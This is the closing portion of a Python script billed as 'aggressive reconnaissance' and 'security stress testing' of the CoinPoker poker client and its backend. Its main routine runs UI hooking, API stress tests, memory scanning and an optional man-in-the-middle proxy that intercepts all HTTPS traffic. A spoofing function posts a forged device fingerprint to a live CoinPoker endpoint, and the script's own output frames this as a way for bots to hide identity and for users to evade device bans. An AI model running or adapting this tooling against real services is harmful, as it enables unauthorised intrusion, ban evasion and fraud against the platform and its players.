            for result in self.report.get("api_tests", []):
                f.write(f"\n[{result.get('status_code')}] {result.get('url')}\n")
                if result.get("data"):
                    if isinstance(result["data"], dict):
                        f.write(json.dumps(result["data"], indent=2, ensure_ascii=False))
                    else:
                        f.write(str(result["data"]))
                    f.write("\n")
            f.write("\n")
            
            # Security findings
            f.write("SECURITY FINDINGS:\n")
            f.write("-" * 40 + "\n")
            f.write(json.dumps(self.report.get("security", {}), indent=2))
            f.write("\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("END OF COMPLETE LOG\n")
            f.write("=" * 80 + "\n")
        
        self.log(f"📋 COMPLETE LOG: {complete_log}", "OK")
    
    # =========================================================================
    # MAIN
    # =========================================================================
    
    def run(self, enable_mitm: bool = False):
        """Run full aggressive reconnaissance."""
        print("\n" + "="*70)
        print("  🔥 COINPOKER AGGRESSIVE RECONNAISSANCE 🔥")
        print("  Security Stress Testing Tool")
        print("="*70)
        print(f"  Admin Mode: {'YES ✅' if self.report['admin_mode'] else 'NO ⚠️'}")
        print("="*70 + "\n")
        
        if not self.find_coinpoker():
            return False
        
        try:
            # Phase 1: UI Hooks
            self.hook_ui()
            
            # Phase 2: Network Analysis
            self.analyze_network()
            
            # Phase 3A: Test discovered APIs (from your MITM captures!)
            self.test_discovered_apis()
            
            # Phase 3B: Stress test all endpoints
            self.test_apis()
            
            # Phase 4: Memory Scan
            self.scan_memory()
            
            # Phase 5: MITM Proxy (optional)
            if enable_mitm:
                self.enable_proxy()
            
            # Phase 6: Security Analysis
            self.analyze_security()
            
            # Generate Report
            self.generate_report()
            
            return True
            
        finally:
            # Cleanup
            if enable_mitm:
                self.disable_proxy()


def test_fingerprint_spoof():
    """Test if we can spoof fingerprint data to CoinPoker."""
    print("\n" + "="*70)
    print("  🎭 FINGERPRINT SPOOFING TEST")
    print("="*70)
    
    if not HAS_REQUESTS:
        print("  ❌ requests library required")
        return
    
    print("\n  This will send FAKE fingerprint data to CoinPoker's health endpoint.")
    print("  The server should NOT accept arbitrary data, but it does!\n")
    
    try:
        name = input("  Enter fake name (e.g. 'Martina'): ").strip() or "Martina"
    except:
        name = "Martina"
    
    fake_fingerprint = {
        "nick": "TestPlayer",
        "os_login_name": name,
        "os_security_identifier": name.lower(),
        "mac_addresses": "AA:BB:CC:DD:EE:FF",
        "router_mac_address": "11:22:33:44:55:66",
        "display_resolutions": "1920x1080",
        "keyboard_language": "en",
        "os_language": "en",
        "volume_id": "FAKEVOLUME",
        "vm_name": "Spoofed VM",
        "client_version_id": "spoofed-test-12345",
    }
    
    print(f"\n  📤 Sending fake fingerprint:")
    print(f"     os_login_name: {name}")
    print(f"     mac_addresses: AA:BB:CC:DD:EE:FF")
    print(f"     router_mac: 11:22:33:44:55:66")
    print(f"     volume_id: FAKEVOLUME")
    
    try:
        resp = requests.post(
            "https://api.coinpokerbackend.com/init/health/update",
            json=fake_fingerprint,
            timeout=10,
            headers={"User-Agent": "CoinPoker/1.0"}
        )
        
        print(f"\n  📥 Response: {resp.status_code}")
        
        if resp.status_code in [200, 201, 204]:
            print("\n  ⚠️  SERVER ACCEPTED FAKE FINGERPRINT DATA!")
            print("  ⚠️  This is a SECURITY VULNERABILITY!")
            print(f"  ⚠️  CoinPoker now thinks your name is '{name}'")
            print("\n  IMPACT:")
            print("    - Bots can spoof their identity")
            print("    - Users can evade device bans")
            print("    - Fingerprint-based detection is bypassable")
        else:
            print(f"\n  Server rejected the data (status: {resp.status_code})")
            try:
                print(f"  Response: {resp.text[:200]}")
            except:
                pass
                
    except Exception as e:
        print(f"\n  ❌ Error: {e}")
    
    print("\n" + "="*70)
    input("  Press Enter to continue...")


def main():
    if not HAS_DEPS:
        return 1
    
    print("\n" + "="*70)
    print("  🔥 COINPOKER SECURITY TESTING 🔥")
    print("="*70)
    print("\n  OPTIONS:")
    print("  1. Run reconnaissance only (safe)")
    print("  2. Run with MITM proxy (aggressive)")
    print("  3. Test fingerprint spoofing (send fake identity)")
    print("  4. Full test (recon + spoofing)")
    print("="*70)
    
    try:
        choice = input("\nSelect [1/2/3/4] (default=1): ").strip()
    except:
        choice = "1"
    
    # Handle fingerprint spoofing
    if choice == "3":
        test_fingerprint_spoof()
        return 0
    
    if choice == "4":
        test_fingerprint_spoof()
        choice = "1"  # Continue with recon
    
    enable_mitm = choice == "2"
    
    if enable_mitm:
        print("\n⚠️  WARNING: MITM mode will:")
        print("    - Enable Windows system proxy")
        print("    - Intercept ALL HTTPS traffic")
        print("    - Require mitmproxy certificate installed")
        try:
            confirm = input("\nContinue? [y/N]: ").strip().lower()
            if confirm != 'y':
                enable_mitm = False
        except:
            enable_mitm = False
    
    recon = AggressiveRecon()
    success = recon.run(enable_mitm=enable_mitm)
    
    print("\n" + "="*70)
    if success:
        print("  ✅ RECONNAISSANCE COMPLETE")
        print(f"  📁 Results saved to: tests/recon_output/")
    else:
        print("  ❌ RECONNAISSANCE FAILED")
    print("="*70 + "\n")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
